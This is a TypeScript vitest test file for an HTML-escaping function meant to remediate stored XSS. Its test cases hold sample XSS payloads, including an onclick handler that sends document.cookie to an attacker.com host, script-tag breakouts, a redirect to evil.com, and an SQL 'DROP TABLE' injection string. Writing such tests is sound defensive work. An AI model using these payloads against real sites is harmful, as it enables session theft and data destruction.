import { describe, it, expect } from "vitest";

describe("Stored XSS Remediation & HTML Escaping", () => {
  function escapeHtml(str: unknown): string {
    if (str === null || str === undefined) return "";
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  it("should escape script tags and prevent tag breakout", () => {
    const payload = "</pre><script>alert('pwned')</script>";
    const escaped = escapeHtml(payload);

    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</pre>");
    expect(escaped).toBe("&lt;/pre&gt;&lt;script&gt;alert(&#39;pwned&#39;)&lt;/script&gt;");
  });

  it("should escape event handler injection in attributes", () => {
    const payload = `" onclick="fetch('http://attacker.com?leak=' + document.cookie)"`;
    const escaped = escapeHtml(payload);

    expect(escaped).not.toContain('" onclick=');
    expect(escaped).toContain("&quot; onclick=&quot;");
  });

  it("should escape image onerror payloads", () => {
    const payload = '<img src="x" onerror="alert(document.domain)">';
    const escaped = escapeHtml(payload);

    expect(escaped).not.toContain("<img");
    expect(escaped).toContain("&lt;img src=&quot;x&quot; onerror=&quot;alert(document.domain)&quot;&gt;");
  });

  it("should safely format untrusted complex parameter JSON", () => {
    const maliciousParams = {
      tableName: "users; DROP TABLE users;--",
      filter: '</pre><script>document.location="http://evil.com"</script>',
      nested: {
        payload: '<svg/onload=alert("xss")>',
      },
    };

    const serialized = JSON.stringify(maliciousParams, null, 2);
    const escaped = escapeHtml(serialized);

    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("<svg");
    expect(escaped).toContain("&lt;/pre&gt;&lt;script&gt;");
    expect(escaped).toContain("&lt;svg/onload=alert(\\&quot;xss\\&quot;)&gt;");
  });
});
